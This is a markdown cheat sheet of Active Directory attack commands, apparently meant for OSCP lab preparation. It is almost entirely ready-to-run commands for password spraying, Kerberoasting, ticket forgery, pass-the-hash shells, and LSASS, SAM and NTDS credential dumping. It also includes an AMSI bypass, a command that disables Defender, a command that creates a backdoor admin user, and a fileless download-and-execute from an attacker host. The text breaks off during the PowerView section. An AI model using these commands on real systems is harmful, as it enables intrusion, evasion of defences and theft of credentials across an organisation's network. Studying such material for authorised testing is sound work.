# Active Directory — OSCP Tools Complete Reference
## Every Tool, Every Payload, Every Use Case

> **For:** OSCP exam preparation and authorized penetration testing labs only.
> `[KALI]` = Kali attack machine | `[WINDOWS]` = Windows victim/foothold

---

## TABLE OF CONTENTS
1. [Recon Tools](#recon-tools)
2. [SMB Tools](#smb-tools)
3. [RPC Tools](#rpc-tools)
4. [LDAP Tools](#ldap-tools)
5. [Kerberos Tools](#kerberos-tools)
6. [BloodHound Tools](#bloodhound-tools)
7. [Hash Cracking Tools](#hash-cracking-tools)
8. [Shell Tools](#shell-tools)
9. [Credential Dumping Tools](#credential-dumping-tools)
10. [Windows Enumeration Tools](#windows-enumeration-tools)
11. [Privilege Escalation Tools](#privilege-escalation-tools)
12. [Persistence Tools](#persistence-tools)

---

## RECON TOOLS

---

### nmap
**What:** Port scanner and service detector
**When:** Always first — find DC, open ports, service versions
**Platform:** `[KALI]`

```bash
# Host discovery — find live machines
nmap -sn 192.168.1.0/24

# Quick scan — top ports only
nmap -sC -sV --open -T4 192.168.1.10

# Full scan — all 65535 ports (use in exam)
nmap -sC -sV -p- --open -T4 -oN dc_scan.txt 192.168.1.10

# Specific AD ports only (faster)
nmap -sC -sV -p 53,88,135,139,389,445,464,636,3268,3269,3389,5985 192.168.1.10

# UDP scan (DNS)
nmap -sU -p 53 192.168.1.10

# Stealth scan
nmap -sS -T2 -p- 192.168.1.10
```

**Output to look for:**
```
# Domain name — smb-os-discovery script output:
| smb-os-discovery:
|   Domain name: corp.local          ← copy this
|   FQDN: DC01.corp.local            ← copy this
```

---

### nbtscan
**What:** NetBIOS name scanner — finds Windows machines and DC tag
**When:** Quick host ID, ICMP may be blocked
**Platform:** `[KALI]`

```bash
# Scan entire subnet
nbtscan 192.168.1.0/24

# Single host
nbtscan 192.168.1.10

# Verbose output
nbtscan -v 192.168.1.0/24
```

**Output reading:**
```
192.168.1.10    CORP\DC01    SHARING DC    ← "DC" = Domain Controller
192.168.1.20    CORP\WS01    SHARING
192.168.1.21    CORP\WS02    SHARING
```

---

### arp-scan
**What:** ARP-based host discovery — works when ICMP blocked
**When:** nmap ping sweep returns nothing
**Platform:** `[KALI]`

```bash
# Scan local network (auto-detect interface)
sudo arp-scan -l

# Specific range
sudo arp-scan 192.168.1.0/24

# Specific interface
sudo arp-scan -I eth0 192.168.1.0/24
```

---

## SMB TOOLS

---

### smbclient
**What:** SMB client — browse shares, download files
**When:** Null session check, browse shares, download interesting files
**Platform:** `[KALI]`

```bash
# List shares — null session (no password)
smbclient -N -L //192.168.1.10

# List shares — with credentials
smbclient -L //192.168.1.10 -U 'corp/username%Password123!'

# Connect to specific share — null session
smbclient -N //192.168.1.10/SYSVOL

# Connect with credentials
smbclient //192.168.1.10/SharedFiles -U 'corp/username%Password123!'

# Inside smbclient shell:
smb: \> ls                          # list files
smb: \> cd foldername               # change directory
smb: \> get filename.txt            # download file
smb: \> put localfile.txt           # upload file
smb: \> recurse on                  # enable recursive listing
smb: \> ls                          # now lists all subdirs
smb: \> mget *                      # download everything

# Download specific file directly
smbclient -N //192.168.1.10/SYSVOL -c "get corp.local/Policies/{GUID}/User/Groups.xml /tmp/Groups.xml"
```

---

### smbmap
**What:** SMB share mapper — shows permissions (READ/WRITE)
**When:** Check what access you have on shares
**Platform:** `[KALI]`

```bash
# Anonymous check
smbmap -H 192.168.1.10

# Guest user
smbmap -u guest -p "" -H 192.168.1.10

# With credentials
smbmap -u username -p 'Password123!' -d corp.local -H 192.168.1.10

# With NT hash
smbmap -u username -p 'aad3...:32ed87...' -H 192.168.1.10

# List contents of specific share
smbmap -H 192.168.1.10 -r SYSVOL

# Recursive listing
smbmap -H 192.168.1.10 -R SharedFiles

# Download file
smbmap -H 192.168.1.10 --download 'SharedFiles\passwords.txt'

# Upload file
smbmap -H 192.168.1.10 --upload /tmp/test.txt 'SharedFiles\test.txt'
```

**Output reading:**
```
Disk          Permissions    Comment
----          -----------    -------
ADMIN$        NO ACCESS
C$            NO ACCESS
IPC$          READ ONLY
SYSVOL        READ ONLY      ← can browse
SharedFiles   READ, WRITE    ← can read AND write
```

---

### nxc / crackmapexec (NetExec)
**What:** Swiss Army knife — SMB/WinRM/RDP/WMI enum, spray, exec
**When:** Everything — host discovery, credential validation, spraying, executing commands
**Platform:** `[KALI]`

```bash
# ---- SMB ENUMERATION ----

# Discover all SMB hosts + domain info
nxc smb 192.168.1.0/24

# Password policy
nxc smb 192.168.1.10 --pass-pol
nxc smb 192.168.1.10 -u '' -p '' --pass-pol

# List shares (null session)
nxc smb 192.168.1.10 -u '' -p '' --shares

# List shares (with creds)
nxc smb 192.168.1.10 -u username -p 'Password123!' --shares

# List shares (with hash)
nxc smb 192.168.1.10 -u username -H NTHASH --shares

# Enumerate users
nxc smb 192.168.1.10 -u '' -p '' --users
nxc smb 192.168.1.10 -u username -p 'Password123!' --users

# Enumerate groups
nxc smb 192.168.1.10 -u username -p 'Password123!' --groups

# Logged on users
nxc smb 192.168.1.10 -u username -p 'Password123!' --loggedon-users

# ---- CREDENTIAL VALIDATION ----

# Validate single credential
nxc smb 192.168.1.10 -u username -p 'Password123!' -d corp.local

# Validate hash (PtH)
nxc smb 192.168.1.10 -u username -H NTHASH

# Validate across entire subnet
nxc smb 192.168.1.0/24 -u username -p 'Password123!' -d corp.local

# Local auth (not domain)
nxc smb 192.168.1.20 -u Administrator -p 'Password123!' --local-auth

# ---- PASSWORD SPRAY ----

# Single password against all users
nxc smb 192.168.1.10 -u userlist.txt -p 'Password123!' --continue-on-success

# With domain
nxc smb 192.168.1.10 -u userlist.txt -p 'Password123!' -d corp.local --continue-on-success

# Multiple passwords (one per user — no bruteforce)
nxc smb 192.168.1.10 -u userlist.txt -p passwords.txt --no-bruteforce --continue-on-success

# ---- COMMAND EXECUTION ----

# Run command via SMB
nxc smb 192.168.1.20 -u Administrator -p 'Password123!' -x "whoami"
nxc smb 192.168.1.20 -u Administrator -H NTHASH -x "net localgroup administrators"

# PowerShell command
nxc smb 192.168.1.20 -u Administrator -p 'Password123!' -X "Get-Process"

# ---- WINRM ----

# Check WinRM access
nxc winrm 192.168.1.0/24 -u username -p 'Password123!'
nxc winrm 192.168.1.20 -u username -H NTHASH

# ---- WMI ----

# Run command via WMI
nxc wmi 192.168.1.20 -u Administrator -p 'Password123!' -x "whoami"

# ---- RDP ----

# Check RDP access
nxc rdp 192.168.1.0/24 -u username -p 'Password123!'
```

**Output meanings:**
```
[+] corp\username:Password123! (Pwn3d!)  ← LOCAL ADMIN on that machine
[+] corp\username:Password123!           ← valid but not local admin
[-] corp\username:Password123! STATUS_LOGON_FAILURE  ← wrong password
[-] corp\username:Password123! STATUS_ACCOUNT_LOCKED_OUT ← STOP!
```

---

## RPC TOOLS

---

### rpcclient
**What:** RPC client — enumerate domain users, groups, password policy
**When:** Null session RPC, get userlist and policy before any attack
**Platform:** `[KALI]`

```bash
# Connect — null session
rpcclient -U "" -N 192.168.1.10

# Connect — with credentials
rpcclient -U 'corp/username%Password123!' 192.168.1.10

# Run single command without interactive shell
rpcclient -U "" -N 192.168.1.10 -c "enumdomusers"
rpcclient -U "" -N 192.168.1.10 -c "getdompwinfo"

# ---- INSIDE RPCCLIENT SHELL ----

# List all domain users
rpcclient $> enumdomusers

# List all domain groups
rpcclient $> enumdomgroups

# Password policy (MOST IMPORTANT)
rpcclient $> getdompwinfo

# Domain info
rpcclient $> querydominfo

# User details by RID
rpcclient $> queryuser 0x44f

# All user details
rpcclient $> querydispinfo

# Change password (ForceChangePassword attack)
rpcclient $> setuserinfo2 targetuser 23 'NewPass123!'
```

**getdompwinfo output:**
```
min_password_length: 7
password_properties: DOMAIN_PASSWORD_COMPLEX
# Look for lockout in querydominfo:
Account Lockout Threshold: 3    ← CRITICAL — max 2 attempts per user
Account Lockout Duration: 30    ← wait 30 min between rounds
```

---

### enum4linux-ng
**What:** All-in-one enumeration — SMB + RPC + LDAP combined
**When:** Quick comprehensive enum, saves time vs running each tool separately
**Platform:** `[KALI]`

```bash
# Full enumeration
enum4linux-ng -A 192.168.1.10

# Save output
enum4linux-ng -A 192.168.1.10 | tee enum4linux_output.txt

# Users only
enum4linux-ng -U 192.168.1.10

# Shares only
enum4linux-ng -S 192.168.1.10

# Password policy only
enum4linux-ng -P 192.168.1.10

# With credentials
enum4linux-ng -A 192.168.1.10 -u username -p 'Password123!'
```

---

## LDAP TOOLS

---

### ldapsearch
**What:** Raw LDAP query tool
**When:** Anonymous bind check, dump users/groups/computers
**Platform:** `[KALI]`

```bash
# Test anonymous bind
ldapsearch -x -H ldap://192.168.1.10 -b "" -s base

# Dump everything (anonymous)
ldapsearch -x -H ldap://192.168.1.10 -b "DC=corp,DC=local"

# Users only
ldapsearch -x -H ldap://192.168.1.10 \
  -b "DC=corp,DC=local" \
  "(objectClass=user)" \
  sAMAccountName description memberOf

# Find AS-REP roastable users (DONT_REQUIRE_PREAUTH flag)
ldapsearch -x -H ldap://192.168.1.10 \
  -b "DC=corp,DC=local" \
  "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" \
  sAMAccountName

# Find Kerberoastable users (have SPN)
ldapsearch -x -H ldap://192.168.1.10 \
  -b "DC=corp,DC=local" \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName

# Groups
ldapsearch -x -H ldap://192.168.1.10 \
  -b "DC=corp,DC=local" \
  "(objectClass=group)" cn member

# Computers
ldapsearch -x -H ldap://192.168.1.10 \
  -b "DC=corp,DC=local" \
  "(objectClass=computer)" cn operatingSystem

# With credentials
ldapsearch -x -H ldap://192.168.1.10 \
  -D "corp\username" -w "Password123!" \
  -b "DC=corp,DC=local" \
  "(objectClass=user)" sAMAccountName
```

---

### ldapdomaindump
**What:** LDAP dumper that creates readable HTML reports
**When:** Have credentials, want pretty HTML output for all users/groups/computers
**Platform:** `[KALI]`

```bash
# Anonymous
ldapdomaindump -u '' -p '' ldap://192.168.1.10 -o /tmp/ldap_dump/

# With credentials
ldapdomaindump -u 'corp\username' -p 'Password123!' \
  ldap://192.168.1.10 -o /tmp/ldap_dump/

# Open reports in browser
firefox /tmp/ldap_dump/domain_users.html
firefox /tmp/ldap_dump/domain_groups.html
firefox /tmp/ldap_dump/domain_computers.html
firefox /tmp/ldap_dump/domain_policy.html
```

**In domain_users.html look for:**
```
DONT_REQUIRE_PREAUTH  ← AS-REP Roastable
PASSWD_NOTREQD        ← blank password possible
ACCOUNTDISABLED       ← skip
```

---

## KERBEROS TOOLS

---

### kerbrute
**What:** Kerberos-based user enumeration and password spray
**When:** Validate/expand userlist via Kerberos, stealth spray
**Platform:** `[KALI]`

```bash
# Install
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 \
  -O /usr/local/bin/kerbrute
chmod +x /usr/local/bin/kerbrute

# User enumeration
kerbrute userenum \
  --dc 192.168.1.10 \
  --domain corp.local \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -o kerbrute_valid_users.txt

# Password spray
kerbrute passwordspray \
  --dc 192.168.1.10 \
  --domain corp.local \
  userlist.txt \
  'Password123!'

# Single user brute (careful — lockout)
kerbrute bruteuser \
  --dc 192.168.1.10 \
  --domain corp.local \
  passwords.txt \
  username
```

---

### impacket-GetNPUsers (AS-REP Roasting)
**What:** AS-REP Roasting — gets hashes for users with pre-auth disabled
**When:** No credentials needed — first attack to try
**Platform:** `[KALI]`

```bash
# With userlist — no creds
impacket-GetNPUsers corp.local/ \
  -usersfile userlist.txt \
  -dc-ip 192.168.1.10 \
  -no-pass \
  -format hashcat \
  -outputfile asrep_hashes.txt

# With credentials — auto-enumerate vulnerable users
impacket-GetNPUsers corp.local/username:Password123! \
  -dc-ip 192.168.1.10 \
  -request \
  -format hashcat \
  -outputfile asrep_hashes.txt

# With NT hash
impacket-GetNPUsers corp.local/username \
  -hashes :NTHASH \
  -dc-ip 192.168.1.10 \
  -request \
  -format hashcat \
  -outputfile asrep_hashes.txt
```

**Output (hash to crack):**
```
$krb5asrep$23$svc_backup@CORP.LOCAL:a3f8c2d1...LONG_HASH...
```

---

### impacket-GetUserSPNs (Kerberoasting)
**What:** Kerberoasting — gets TGS hashes for service accounts
**When:** Have any valid domain credential
**Platform:** `[KALI]`

```bash
# List SPN accounts (no hash)
impacket-GetUserSPNs corp.local/username:Password123! \
  -dc-ip 192.168.1.10

# Get hashes
impacket-GetUserSPNs corp.local/username:Password123! \
  -dc-ip 192.168.1.10 \
  -request \
  -outputfile kerberoast_hashes.txt

# With NT hash
impacket-GetUserSPNs corp.local/username \
  -hashes :NTHASH \
  -dc-ip 192.168.1.10 \
  -request \
  -outputfile kerberoast_hashes.txt
```

**Output (hash to crack):**
```
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$a3f8...
# $23$ = RC4 → hashcat mode 13100 (fast)
# $18$ = AES → hashcat mode 19700 (slow)
```

---

### impacket-getTGT
**What:** Generate Kerberos TGT (.ccache file) from credentials or hash
**When:** Pass-the-Ticket from Kali
**Platform:** `[KALI]`

```bash
# From password
impacket-getTGT corp.local/username:Password123! \
  -dc-ip 192.168.1.10
# Output: username.ccache

# From NT hash
impacket-getTGT corp.local/username \
  -hashes :NTHASH \
  -dc-ip 192.168.1.10

# Use the ticket
export KRB5CCNAME=/path/to/username.ccache
impacket-psexec corp.local/username@DC01.corp.local -k -no-pass
# NOTE: Use HOSTNAME not IP with -k!
```

---

### impacket-ticketer (Golden/Silver Ticket)
**What:** Forge Kerberos tickets — Golden (krbtgt) or Silver (service account)
**When:** Have krbtgt hash → Golden Ticket for persistence
**Platform:** `[KALI]`

```bash
# Get Domain SID first
impacket-getPac corp.local/Administrator:Password123! -targetUser Administrator

# Golden Ticket (needs krbtgt hash + domain SID)
impacket-ticketer \
  -nthash KRBTGT_NTHASH \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain corp.local \
  FakeAdmin
# Output: FakeAdmin.ccache

# Use Golden Ticket
export KRB5CCNAME=FakeAdmin.ccache
impacket-psexec corp.local/FakeAdmin@DC01.corp.local -k -no-pass
impacket-wmiexec corp.local/FakeAdmin@DC01.corp.local -k -no-pass

# Silver Ticket (needs service account hash)
impacket-ticketer \
  -nthash SVC_ACCOUNT_NTHASH \
  -domain-sid S-1-5-21-xxx-xxx-xxx \
  -domain corp.local \
  -spn MSSQLSvc/sql01.corp.local:1433 \
  Administrator
```

---

### Rubeus (Windows)
**What:** Windows Kerberos abuse tool — roasting, tickets, PtT
**When:** Windows foothold — Kerberoast, AS-REP, dump tickets, inject
**Platform:** `[WINDOWS]`

```powershell
# Upload first
*Evil-WinRM* PS> upload /opt/Rubeus.exe C:\Temp\Rubeus.exe

# Kerberoasting
C:\Temp\Rubeus.exe kerberoast /format:hashcat /outfile:kerb_hashes.txt
C:\Temp\Rubeus.exe kerberoast /user:svc_sql /format:hashcat /outfile:kerb.txt
C:\Temp\Rubeus.exe kerberoast /rc4opsec /format:hashcat /outfile:rc4.txt  # force RC4

# AS-REP Roasting
C:\Temp\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
C:\Temp\Rubeus.exe asreproast /user:svc_backup /format:hashcat

# Dump tickets
C:\Temp\Rubeus.exe dump /service:krbtgt
C:\Temp\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# Pass-the-Ticket (inject ticket)
C:\Temp\Rubeus.exe ptt /ticket:BASE64_OR_FILE.kirbi

# Overpass-the-Hash (hash → TGT)
C:\Temp\Rubeus.exe asktgt /user:Administrator /rc4:NTHASH /ptt
C:\Temp\Rubeus.exe asktgt /user:Administrator /aes256:AESHASH /ptt

# Verify tickets
klist
klist purge   # clear all tickets

# Stats on Kerberoastable accounts
C:\Temp\Rubeus.exe kerberoast /stats
```

---

## BLOODHOUND TOOLS

---

### bloodhound-python
**What:** BloodHound data collector — runs from Kali with credentials
**When:** Have valid domain creds, no Windows foothold yet
**Platform:** `[KALI]`

```bash
# Install
pip install bloodhound

# Full collection (all methods)
bloodhound-python \
  -u username \
  -p 'Password123!' \
  -d corp.local \
  -dc DC01.corp.local \
  -ns 192.168.1.10 \
  -c All \
  --zip

# With NT hash
bloodhound-python \
  -u username \
  --hashes :NTHASH \
  -d corp.local \
  -dc DC01.corp.local \
  -ns 192.168.1.10 \
  -c All \
  --zip

# Specific collection methods
bloodhound-python -u user -p pass -d corp.local -ns DC_IP -c DCOnly
bloodhound-python -u user -p pass -d corp.local -ns DC_IP -c Session,Trusts
```

---

### SharpHound (Windows)
**What:** BloodHound data collector — runs on Windows
**When:** Have Windows foothold (evil-winrm shell)
**Platform:** `[WINDOWS]`

```powershell
# Upload
*Evil-WinRM* PS> upload /opt/SharpHound.exe C:\Temp\SharpHound.exe

# Run full collection
C:\Temp\SharpHound.exe -c All

# Specific methods
C:\Temp\SharpHound.exe -c All,GPOLocalGroup

# Output: 20240115_BloodHound.zip in current directory
# Download back to Kali
*Evil-WinRM* PS> download C:\Temp\20240115_BloodHound.zip /tmp/
```

---

### BloodHound (GUI)
**What:** Attack path visualization — find path to Domain Admin
**When:** After importing SharpHound/bloodhound-python data
**Platform:** `[KALI]` (GUI)

```bash
# Start Neo4j database
sudo neo4j start
# Browser: http://localhost:7474 → neo4j / neo4j → change to neo4j / bloodhound

# Start BloodHound
bloodhound &
# Login: neo4j / bloodhound

# Fix Neo4j issues
sudo systemctl status neo4j
sudo apt install default-jdk
sudo neo4j start
```

**Key queries (Analysis tab → Pre-Built Queries):**
```
Find Shortest Paths to Domain Admins    ← MOST IMPORTANT
List all Kerberoastable Accounts
Find AS-REP Roastable Users
Find Computers where Domain Users are Local Admin
Shortest Path from Owned Principals    ← after marking accounts Owned
Find Principals with DCSync Rights
```

**Marking accounts owned:**
```
Search account → Right click → Mark as Owned
Then run: Shortest Path from Owned Principals
```

---

## HASH CRACKING TOOLS

---

### hashcat
**What:** GPU-accelerated hash cracker
**When:** After getting any hash
**Platform:** `[KALI]`

```bash
# ---- AS-REP ROAST (mode 18200) ----
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
hashcat -m 18200 asrep_hashes.txt --show   # show cracked

# ---- KERBEROAST RC4 (mode 13100) ---- FAST
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 kerberoast_hashes.txt --show

# ---- KERBEROAST AES256 (mode 19700) ---- SLOW
hashcat -m 19700 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# ---- NT HASH (mode 1000) ----
hashcat -m 1000 nt_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat --username -m 1000 all_hashes.txt rockyou.txt  # with usernames
hashcat -m 1000 nt_hashes.txt --show

# ---- NTLMv2 (mode 5600) ---- from Responder
hashcat -m 5600 ntlmv2_hashes.txt /usr/share/wordlists/rockyou.txt

# ---- WITH RULES (more powerful) ----
hashcat -m 13100 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 13100 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/toggles1.rule
hashcat -m 13100 hashes.txt rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule \
  -r /usr/share/hashcat/rules/toggles1.rule

# ---- CUSTOM WORDLIST (CeWL) ----
cewl http://corp.local -w /tmp/custom.txt
hashcat -m 13100 hashes.txt /tmp/custom.txt

# ---- BRUTE FORCE short passwords ----
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?d?d?d
```

**Mode Quick Reference:**
```
1000   = NT hash
5600   = NTLMv2
13100  = Kerberoast RC4 ($krb5tgs$23$)
18200  = AS-REP ($krb5asrep$23$)
19700  = Kerberoast AES256 ($krb5tgs$18$)
2100   = DCC2 cached creds ($DCC2$)
```

---

### john (John the Ripper)
**What:** CPU hash cracker — alternative to hashcat
**When:** hashcat not available, or for quick test
**Platform:** `[KALI]`

```bash
# AS-REP hash
john asrep_hashes.txt \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  --format=krb5asrep
john asrep_hashes.txt --show --format=krb5asrep

# Kerberoast hash
john kerberoast_hashes.txt \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  --format=krb5tgs
john kerberoast_hashes.txt --show

# NT hash
john nt_hashes.txt \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  --format=NT
john nt_hashes.txt --show --format=NT

# NTLMv2
john ntlmv2.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2
```

---

### gpp-decrypt
**What:** Decrypts Group Policy Preferences passwords (Groups.xml)
**When:** Found Groups.xml in SYSVOL share
**Platform:** `[KALI]`

```bash
# Decrypt GPP password
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ7tP+M5smP9gHGHkwDaOMk="

# Output: Password123!

# Find Groups.xml in SYSVOL first:
smbclient -N //192.168.1.10/SYSVOL
smb: \> recurse on
smb: \> ls
# Look for: \corp.local\Policies\{GUID}\User\Groups.xml
smb: \> get "corp.local/Policies/{GUID}/User/Groups.xml" /tmp/Groups.xml

# Extract cPassword from file
grep -i 'cpassword' /tmp/Groups.xml
# Then run gpp-decrypt on the value
```

---

## SHELL TOOLS

---

### evil-winrm
**What:** WinRM shell with PowerShell — best shell for Windows
**When:** Port 5985 open + admin/WinRM user
**Platform:** `[KALI]`

```bash
# Install
sudo gem install evil-winrm

# With password
evil-winrm -i 192.168.1.20 -u Administrator -p 'Password123!'

# With NT hash (PtH)
evil-winrm -i 192.168.1.20 -u Administrator -H NTHASH

# With domain
evil-winrm -i 192.168.1.20 -u Administrator -p 'Password123!' -d corp.local

# With SSL (port 5986)
evil-winrm -i 192.168.1.20 -u Administrator -p 'Password123!' -S

# Auto-load scripts from folder
evil-winrm -i 192.168.1.20 -u Administrator -H NTHASH -s /opt/scripts/
```

**Inside shell commands:**
```powershell
# Upload file to target
*Evil-WinRM* PS> upload /opt/mimikatz.exe C:\Temp\mimikatz.exe
*Evil-WinRM* PS> upload /opt/PowerView.ps1

# Download file from target
*Evil-WinRM* PS> download C:\Temp\sam.bak /tmp/sam.bak
*Evil-WinRM* PS> download C:\Users\Administrator\Desktop\proof.txt /tmp/

# Built-in AMSI bypass
*Evil-WinRM* PS> Bypass-4MSI

# Show available features
*Evil-WinRM* PS> menu

# Import script (after -s flag or upload)
*Evil-WinRM* PS> Import-Module C:\Temp\PowerView.ps1
```

---

### impacket-psexec
**What:** SYSTEM shell via SMB — copies service binary to ADMIN$
**When:** Admin on port 445, need SYSTEM shell
**Platform:** `[KALI]`

```bash
# Password
impacket-psexec corp.local/Administrator:Password123!@192.168.1.20

# NT hash
impacket-psexec corp.local/Administrator@192.168.1.20 \
  -hashes :NTHASH

# LM:NT format
impacket-psexec corp.local/Administrator@192.168.1.20 \
  -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH

# Kerberos ticket
export KRB5CCNAME=/path/to/ticket.ccache
impacket-psexec corp.local/Administrator@DC01.corp.local -k -no-pass
```

**Result:** `nt authority\system` shell — SYSTEM level

---

### impacket-wmiexec
**What:** Admin shell via WMI — quieter than psexec
**When:** Default choice for lateral movement
**Platform:** `[KALI]`

```bash
# Password
impacket-wmiexec corp.local/Administrator:Password123!@192.168.1.20

# NT hash
impacket-wmiexec corp.local/Administrator@192.168.1.20 \
  -hashes :NTHASH

# Kerberos
export KRB5CCNAME=/path/to/ticket.ccache
impacket-wmiexec corp.local/Administrator@WS02.corp.local -k -no-pass
```

**Inside shell:**
```bash
# Upload file
C:\> lput /opt/mimikatz.exe C:\Temp\mimikatz.exe

# Download file
C:\> lget C:\Temp\loot.txt /tmp/loot.txt
```

---

### impacket-smbexec
**What:** Shell via SMB without binary upload — stealthier
**When:** psexec fails, AV blocks binary upload
**Platform:** `[KALI]`

```bash
# Password
impacket-smbexec corp.local/Administrator:Password123!@192.168.1.20

# NT hash
impacket-smbexec corp.local/Administrator@192.168.1.20 \
  -hashes :NTHASH
```

---

### impacket-atexec
**What:** Single command execution via Task Scheduler
**When:** No interactive shell needed — just run one command
**Platform:** `[KALI]`

```bash
# Single command
impacket-atexec corp.local/Administrator@192.168.1.20 \
  -hashes :NTHASH "whoami"

impacket-atexec corp.local/Administrator@192.168.1.20 \
  -hashes :NTHASH "ipconfig /all"

impacket-atexec corp.local/Administrator@192.168.1.20 \
  -hashes :NTHASH "net localgroup administrators"

# Add backdoor user
impacket-atexec corp.local/Administrator@192.168.1.20 \
  -hashes :NTHASH \
  "net user hacker Password123! /add && net localgroup administrators hacker /add"
```

---

### impacket-dcomexec
**What:** Shell via DCOM — legitimate Windows framework abuse
**When:** WMI and WinRM both fail, port 135 open
**Platform:** `[KALI]`

```bash
# MMC20 object (most common)
impacket-dcomexec corp.local/Administrator:Password123!@192.168.1.20 \
  -object MMC20

# NT hash
impacket-dcomexec corp.local/Administrator@192.168.1.20 \
  -hashes :NTHASH \
  -object MMC20

# Try different objects if MMC20 fails
impacket-dcomexec corp.local/Administrator@192.168.1.20 \
  -hashes :NTHASH -object ShellWindows

impacket-dcomexec corp.local/Administrator@192.168.1.20 \
  -hashes :NTHASH -object ShellBrowserWindow
```

---

## CREDENTIAL DUMPING TOOLS

---

### impacket-secretsdump
**What:** Remote credential dumping — SAM, LSASS, NTDS, LSA secrets
**When:** Admin access on target — dump all hashes remotely
**Platform:** `[KALI]`

```bash
# Dump local SAM hashes (password)
impacket-secretsdump corp.local/Administrator:Password123!@192.168.1.20

# Dump with NT hash (PtH)
impacket-secretsdump corp.local/Administrator@192.168.1.20 \
  -hashes :NTHASH

# DCSync — dump domain hashes from DC
impacket-secretsdump corp.local/Administrator:Password123!@192.168.1.10 \
  -just-dc

# DCSync with hash
impacket-secretsdump corp.local/Administrator@192.168.1.10 \
  -hashes :NTHASH \
  -just-dc

# DCSync — specific user only
impacket-secretsdump corp.local/Administrator@192.168.1.10 \
  -hashes :NTHASH \
  -just-dc-user Administrator

# Save DCSync output
impacket-secretsdump corp.local/Administrator@192.168.1.10 \
  -hashes :NTHASH \
  -just-dc \
  -outputfile /tmp/domain_hashes.txt

# Offline — from saved SAM/SYSTEM files
impacket-secretsdump \
  -sam /tmp/sam.bak \
  -system /tmp/system.bak \
  LOCAL

# Offline — from ntds.dit
impacket-secretsdump \
  -ntds /tmp/ntds.dit \
  -system /tmp/SYSTEM \
  LOCAL > /tmp/all_hashes.txt
```

**Output format:**
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
username      :RID:LM_hash (ignore)               :NT_hash (use this)
```

---

### mimikatz
**What:** Windows credential extraction — LSASS memory, SAM, DCSync
**When:** Windows foothold with admin/SYSTEM
**Platform:** `[WINDOWS]`

```powershell
# Upload
*Evil-WinRM* PS> upload /opt/mimikatz/x64/mimikatz.exe C:\Temp\mimikatz.exe

# AMSI bypass first
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Disable Defender
Set-MpPreference -DisableRealtimeMonitoring $true

# Run mimikatz
C:\Temp\mimikatz.exe
```

```
# Enable debug privilege (ALWAYS FIRST)
mimikatz # privilege::debug
# Output: Privilege '20' OK ← must see this

# Elevate to SYSTEM
mimikatz # token::elevate

# Dump LSASS — all logged-on users hashes + tickets
mimikatz # sekurlsa::logonpasswords

# Dump Kerberos tickets
mimikatz # sekurlsa::tickets /export
# Creates .kirbi files

# Dump local SAM
mimikatz # lsadump::sam

# DCSync — specific user
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator

# DCSync — all users
mimikatz # lsadump::dcsync /domain:corp.local /all /csv

# Golden Ticket
mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-xxx-xxx-xxx /rc4:KRBTGT_HASH /id:500 /groups:512 /ptt

# Inject .kirbi ticket
mimikatz # kerberos::ptt C:\Temp\ticket.kirbi

# Skeleton Key (volatile persistence)
mimikatz # misc::skeleton

# All in one shot
C:\Temp\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
```

**sekurlsa::logonpasswords output — what to copy:**
```
msv:
 * Username : Administrator
 * NTLM     : 32ed87bdb5fdc5e9cba88547376818d4   ← COPY THIS
wdigest:
 * Password : (null)   ← null on Win10+ (was plaintext on Win7)
```

---

### reg save (Offline SAM dump)
**What:** Save registry hives for offline cracking
**When:** Cannot run live tools — save and crack offline
**Platform:** `[WINDOWS]`

```cmd
# Save hives
reg save HKLM\SAM C:\Temp\sam.bak
reg save HKLM\SYSTEM C:\Temp\system.bak
reg save HKLM\SECURITY C:\Temp\security.bak
```

```powershell
# Download to Kali
*Evil-WinRM* PS> download C:\Temp\sam.bak /tmp/sam.bak
*Evil-WinRM* PS> download C:\Temp\system.bak /tmp/system.bak
```

```bash
# Crack offline [KALI]
impacket-secretsdump -sam /tmp/sam.bak -system /tmp/system.bak LOCAL
```

---

## WINDOWS ENUMERATION TOOLS

---

### PowerView
**What:** PowerShell AD enumeration + ACL abuse
**When:** Windows foothold — enumerate AD, exploit ACL edges
**Platform:** `[WINDOWS]`

```powershell
# Load PowerView
# Method 1 — upload and import
*Evil-WinRM* PS> upload /opt/PowerView.ps1 C:\Temp\PowerView.ps1
Import-Module C:\Temp\PowerView.ps1

# Method 2 — in memory (fileless)
IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerView.ps1')

# AMSI bypass before loading
